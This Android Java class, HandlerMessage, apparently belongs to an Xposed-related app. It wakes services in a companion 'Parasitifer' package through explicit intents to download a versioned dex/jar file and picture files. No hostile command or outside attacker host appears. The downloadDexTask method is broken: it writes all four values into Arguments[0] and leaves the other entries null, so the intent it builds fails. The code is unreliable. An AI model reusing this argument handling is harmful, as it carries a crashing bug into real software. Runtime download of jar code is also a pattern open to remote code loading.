package android.mf.application.util;

import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.text.TextUtils;
import android.widget.Toast;

import java.util.ArrayList;

public class HandlerMessage {

    private Context context = null;
    private static String PfPackage = "android.mf.application";
    private static String PfAwakenService = ".service.AwakenService";
    private static String PfHttpFileService = ".service.HttpFileService";

    public HandlerMessage(Context context) {
        this.context = context;
    }

    public void resultTask() {
        AwakenParasitifer(PfPackage, PfPackage + PfAwakenService);
    }

    public void downloadDexTask(double version,Context context) {
        String[] Arguments = new String[4];
        Arguments[0] = PfPackage;
        Arguments[0] = PfPackage + PfHttpFileService;
        Arguments[0] = "XposedDownload";
        Arguments[0] = "[{\"FileHttpUrl\":\"\",\"SavePath\":\""+context.getFilesDir().getAbsolutePath()+"/\",\"FileNmae\":\"MFAppDex_v"+version+".jar\"}]";
        AwakenParasitifer(context,Arguments);
    }

    public void downloadPictureTask(Context context,ArrayList<String> arguments) {
        String[] Arguments = new String[4];
        Arguments[0] = PfPackage;
        Arguments[1] = PfPackage + PfHttpFileService;
        Arguments[2] = "XposedDownload";
        Arguments[3] = "[{\"FileHttpUrl\":\""+arguments.get(0)+"\",\"SavePath\":\""+arguments.get(1)+"\",\"FileNmae\":\""+arguments.get(2)+"\"}]";
        AwakenParasitifer(context,Arguments);
        Toast.makeText(context,Arguments[0], Toast.LENGTH_SHORT).show();
    }

    private boolean isServiceRunning(String ServiceName) {
        if (TextUtils.isEmpty(ServiceName))
            return false;
        ActivityManager myManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        ArrayList<ActivityManager.RunningServiceInfo> runningService = (ArrayList<ActivityManager.RunningServiceInfo>)
                myManager.getRunningServices(30);
        for (int i = 0; i < runningService.size(); i++) {
            if (runningService.get(i).service.getClassName().equals(ServiceName)) {
                return true;
            }
        }
        return false;
    }

    private void AwakenParasitifer(String packageName, String className) {
        Intent intentService = new Intent();
        ComponentName componentName = new ComponentName(packageName, className);
        intentService.setComponent(componentName);
        intentService.putExtra("Key", "AppTask");
        intentService.putExtra("Content", "1");
        context.startService(intentService);
    }

    private void AwakenParasitifer(Context context,String[] Arguments) {
        Intent intentService = new Intent();
        ComponentName componentName = new ComponentName(Arguments[0], Arguments[1]);
        intentService.setComponent(componentName);
        intentService.putExtra("Key", Arguments[2]);
        intentService.putExtra("Content", Arguments[3]);
        context.startService(intentService);
    }
}
